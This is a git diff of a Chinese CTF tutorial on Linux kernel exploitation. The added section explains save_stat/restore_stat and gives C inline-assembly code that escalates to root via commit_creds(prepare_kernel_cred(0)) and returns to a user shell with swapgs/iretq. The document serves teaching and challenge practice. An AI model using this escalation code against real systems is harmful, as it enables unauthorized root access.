@@ -8,7 +8,7 @@ published: true
 | [系统态是什么及系统态和提权有什么关系](#系统态是什么系统态和提权有什么关系) |
 | [如何进入系统态](#如何进入系统态) |
 | [关于内核态的保护及常见绕过办法](#关于内核态的保护及常见绕过办法) |
-| [什么是 save_stat 和 restore_stat，以及如何提权](#) |
+| [什么是 save_stat 和 restore_stat，以及如何提权](#什么是save_stat和restore_stat以及如何提权) |
 | [题目 xman2019 babykernel](#题目-xman2019-babykernel) |
 
 在 Linux 操作系统中 CPU 的特权级别分为四个等级：  
@@ -187,16 +187,73 @@ SMAP 中的 E 为 Access，旨在防止内核态时访问用户态数据. 其开
 		```
 
 		```stack
-		rsp: mov_rdi_rsp
-    	     0
-             0
-             rip
-             cs
-             rflags
-             rsp
-             ss
+		rsp:   mov_rdi_rsp 的地址
+    	       0  
+               0
+               rip         的值
+               cs          的值
+               rflags      的值
+               rsp         的值
+               ss          的值
 		```
 
+
+### [](#header-3)什么是save_stat和restore_stat以及如何提权
+
+相信了解过 kernel pwn 的读者都知道，在打开驱动进入内核态前必须要调用 save_stat 将 cs(代码段寄存器)、ss(栈段寄存器)、rsp(栈寄存器)、rflags(标志位寄存器) 的值放入全局变量.   
+这一操作本身不是必要的，记录这些寄存器的值的目的是防止在 内核态 手动返回到 用户态时，失去用户态上下文(或者说失去用户态的寄存器值)  
+
+需要注意的是，在此过程中不能破坏原先栈结构.  
+
+```c
+unsigned long long user_cs, user_ss, user_rflags, user_sp;
+
+void save_stat() {
+	asm(
+		"movq %%cs, %0;"
+		"movq %%ss, %1;"
+		"movq %%rsp, %2;"
+		"pushfq;"
+		"popq %3;"
+	: "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
+}
+
+int main(){
+	save_stat();
+	...
+}
+```
+
+当后续进行了一系列特权操作提升权限 `如: commit_creds(prepare_kernel_cred(0))` 后，  
+即可手动将存储的 ss、sp、rflags、cs push 到栈上，并且设置 rip 返回地址，最终调用 iretq
+
+```c
+void restore_stat()
+{
+	commit_creds(prepare_kernel_cred(0));
+	asm(
+		"pushq   %0;"
+		"pushq   %1;"
+		"pushq   %2;"
+		"pushq   %3;"
+		"pushq   $shell;"
+		"pushq   $0;"
+		"swapgs;"
+		"popq    %%rbp;"
+		"iretq;"
+	::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
+}
+```
+
+当调用 iretq 时，栈结构如下所示，iretq 按如下结构恢复各个寄存器的值
+
+```stack
+rsp:   rip    的值
+       cs     的值
+       rflags 的值
+	   sp     的值
+       ss     的值
+```
 
 ### [](#header-3)题目 xman2019 babykernel
 
